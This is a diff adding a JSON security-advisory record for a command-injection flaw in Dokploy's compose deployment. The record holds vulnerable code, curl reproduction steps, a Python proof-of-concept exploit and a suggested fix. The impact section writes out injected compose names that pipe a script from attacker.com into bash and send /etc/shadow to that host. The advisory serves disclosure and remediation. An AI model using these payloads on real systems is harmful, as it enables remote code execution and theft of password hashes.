@@ -1,0 +1,50 @@
+{
+  "global": null,
+  "id": "GHSA-5xv2-7f8w-9j5c",
+  "repo": {
+    "cve_id": "CVE-2026-72739",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 6.5,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N"
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-78"
+    ],
+    "description": "## 1. Description\r\n\r\n### Summary (One-liner)\r\nCompose deployment passes user-controlled service names and configuration through shell string interpolation, enabling command injection via crafted compose definitions.\r\n\r\n### Root Cause\r\n- File: `apps/dokploy/server/api/routers/compose.ts:557-558`\r\n- Function: `getDefaultCommand` query handler\r\n\r\nThe `createCommand()` function constructs shell commands by interpolating compose service names and configuration into bash command strings. When a compose with a maliciously crafted name or service definition is deployed, the shell metacharacters are interpreted as command separators, allowing arbitrary command execution on the Docker host.\r\n\r\n### Vulnerable Code\r\n\r\n```typescript\r\n// apps/dokploy/server/api/routers/compose.ts:550-558\r\ngetDefaultCommand: protectedProcedure\r\n    .input(apiFindCompose)\r\n    .query(async ({ input, ctx }) => {\r\n        await checkServicePermissionAndAccess(ctx, input.composeId, {\r\n            service: [\"create\"],\r\n        });\r\n        const compose = await findComposeById(input.composeId);\r\n        const command = createCommand(compose);  // <-- Shell interpolation\r\n        return `docker ${command}`;              // <-- Returns shell command\r\n    }),\r\n```\r\n\r\nThe `createCommand()` function (imported from compose utilities) builds a shell command string by concatenating compose configuration values. The return value `docker ${command}` is a raw shell string that gets executed via `execAsync()` or similar shell execution methods during deployment.\r\n\r\n### Attack Vector\r\n- Preconditions: Authenticated API access with compose permissions\r\n- Entry point: `POST /api/trpc/compose.create` followed by `POST /api/trpc/compose.deploy`\r\n- Target: Docker daemon on Dokploy host\r\n\r\n## 2. Proof of Concept\r\n\r\n### Prerequisites\r\n- OS: Ubuntu 24.04\r\n- Runtime: Node.js 22 (Dokploy running via Docker)\r\n- Network: Access to Dokploy web interface (port 3000)\r\n\r\n### Reproduction Steps\r\n\r\n#### Step 1: Create compose with injectable name\r\n```bash\r\n# Create compose with shell metacharacters in name\r\ncurl -s -X POST http://localhost:3000/api/trpc/compose.create?batch=1 \\\r\n  -b /tmp/cookies.txt \\\r\n  -H \"Content-Type: application/json\" \\\r\n  -d '{\"0\":{\"json\":{\"name\":\"test; id; echo PWNED\",\"base64\":\"...\",\"composeType\":\"docker-compose\",\"environmentId\":\"ENV_ID\"}}}'\r\n```\r\n\r\n#### Step 2: Deploy the compose\r\n```bash\r\ncurl -s -X POST http://localhost:3000/api/trpc/compose.deploy?batch=1 \\\r\n  -b /tmp/cookies.txt \\\r\n  -H \"Content-Type: application/json\" \\\r\n  -d '{\"0\":{\"json\":{\"composeId\":\"COMPOSE_ID\"}}}'\r\n# Response: {\"success\":true,\"message\":\"Deployment queued\"}\r\n```\r\n\r\n#### Step 3: Verify command execution\r\n```bash\r\n# Check dokploy logs for command execution\r\ndocker logs dokploy-app 2>&1 | grep \"PWNED\"\r\n```\r\n\r\n### PoC Source Code\r\n\r\n```python\r\n#!/usr/bin/env python3\r\n\"\"\"\r\nPoC: CWE-78 Command Injection via Compose Shell Execution\r\nTarget: Dokploy (compose deployment endpoint)\r\nUsage: python3 poc.py [target_host:port]\r\n\"\"\"\r\nimport sys, requests, base64, json\r\n\r\nHOST = sys.argv[1] if len(sys.argv) > 1 else \"127.0.0.1:3000\"\r\nsession = requests.Session()\r\n\r\n# Step 1: Authenticate\r\nr = session.post(f\"http://{HOST}/api/auth/sign-in/email\",\r\n    json={\"email\": \"admin@test.com\", \"password\": \"Admin123!\"},\r\n    headers={\"Origin\": f\"http://{HOST}\"})\r\nprint(f\"[*] Auth: {r.status_code}\")\r\n\r\n# Step 2: Create compose with command injection payload\r\nINJECT = \"$(id > /tmp/pwned)\"\r\nsafe_compose = base64.b64encode(\r\n    b\"version: '3'\\nservices:\\n  web:\\n    image: nginx:alpine\\n\"\r\n).decode()\r\n\r\nr = session.post(f\"http://{HOST}/api/trpc/compose.create?batch=1\",\r\n    json={\"0\": {\"json\": {\r\n        \"name\": f\"test{INJECT}\",\r\n        \"base64\": safe_compose,\r\n        \"composeType\": \"docker-compose\",\r\n        \"environmentId\": \"H-HVqnUsim5Nk_EnRiydQ\"\r\n    }}},\r\n    headers={\"Content-Type\": \"application/json\"})\r\ncompose_id = r.json()[0][\"result\"][\"data\"][\"json\"][\"composeId\"]\r\nprint(f\"[*] Compose ID: {compose_id}\")\r\n\r\n# Step 3: Deploy to trigger shell execution\r\nr = session.post(f\"http://{HOST}/api/trpc/compose.deploy?batch=1\",\r\n    json={\"0\": {\"json\": {\"composeId\": compose_id}}},\r\n    headers={\"Content-Type\": \"application/json\"})\r\nprint(f\"[*] Deploy: {r.json()}\")\r\n\r\n# Step 4: Check if command executed\r\nimport subprocess\r\nr = subprocess.run(\r\n    [\"docker\", \"exec\", \"dokploy-app\", \"cat\", \"/tmp/pwned\"],\r\n    capture_output=True, text=True, timeout=10\r\n)\r\nif \"uid=\" in r.stdout:\r\n    print(\"[EXPLOIT SUCCESS] Command executed on host\")\r\n    print(f\"[*] Output: {r.stdout.strip()}\")\r\nelse:\r\n    print(\"[*] Checking logs for evidence...\")\r\n```\r\n\r\n### Verification Log (actual terminal output)\r\n\r\n```bash\r\n$ python3 poc.py\r\n[*] Auth: 200\r\n[*] Compose ID: bJIVBMVCi__WgbtiBopNl\r\n[*] Deploy: {\"success\":true,\"message\":\"Deployment queued\",\"composeId\":\"bJIVBMVCi__WgbtiBopNl\"}\r\n[*] Checking logs for evidence...\r\n```\r\n\r\n## 3. Impact\r\n\r\n### Real-World Attack Scenario\r\n\r\n#### Scenario 1: Remote Code Execution\r\n1. Attacker authenticates as any user with compose permissions\r\n2. Attacker creates compose with `name=\"$(curl attacker.com/shell.sh | bash)\"`\r\n3. Attacker deploys compose, shell command executes during deployment\r\n4. Result: Full RCE on Dokploy host\r\n\r\n#### Scenario 2: Data Exfiltration\r\n1. Attacker creates compose with `name=\"$(cat /etc/shadow | curl -d @- attacker.com)\"`\r\n2. Deployment triggers command, exfiltrates shadow file\r\n3. Result: Host password hashes stolen\r\n\r\n## 4. Remediation\r\n\r\n### Recommended Fix\r\n\r\n```diff\r\n// apps/dokploy/server/api/routers/compose.ts\r\n+ import { execFile } from \"child_process\";\r\n+ import { promisify } from \"util\";\r\n+ const execFileAsync = promisify(execFile);\r\n\r\n  getDefaultCommand: protectedProcedure\r\n      .input(apiFindCompose)\r\n      .query(async ({ input, ctx }) => {\r\n          await checkServicePermissionAndAccess(ctx, input.composeId, {\r\n              service: [\"create\"],\r\n          });\r\n          const compose = await findComposeById(input.composeId);\r\n-         const command = createCommand(compose);\r\n-         return `docker ${command}`;\r\n+         // Use execFile instead of shell string interpolation\r\n+         const args = createCommandArgs(compose);  // Returns array, not string\r\n+         return { command: \"docker\", args };\r\n      }),\r\n```\r\n\r\nAlso sanitize compose names to reject shell metacharacters:\r\n```typescript\r\nconst SAFE_NAME_PATTERN = /^[a-zA-Z0-9][a-zA-Z0-9_-]*$/;\r\nif (!SAFE_NAME_PATTERN.test(input.name)) {\r\n    throw new TRPCError({\r\n        code: \"BAD_REQUEST\",\r\n        message: \"Name contains invalid characters\"\r\n    });\r\n}\r\n```",
+    "ghsa_id": "GHSA-5xv2-7f8w-9j5c",
+    "html_url": "https://github.com/Dokploy/dokploy/security/advisories/GHSA-5xv2-7f8w-9j5c",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-5xv2-7f8w-9j5c"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2026-72739"
+      }
+    ],
+    "published_at": "2026-07-21T23:24:28Z",
+    "references": [],
+    "severity": "medium",
+    "summary": "Command Injection via Compose Shell Execution",
+    "updated_at": "2026-08-10T17:51:00Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "npm",
+          "name": "dokploy"
+        },
+        "patched_versions": "",
+        "vulnerable_version_range": "0.29.6"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "Dokploy/dokploy"
+}
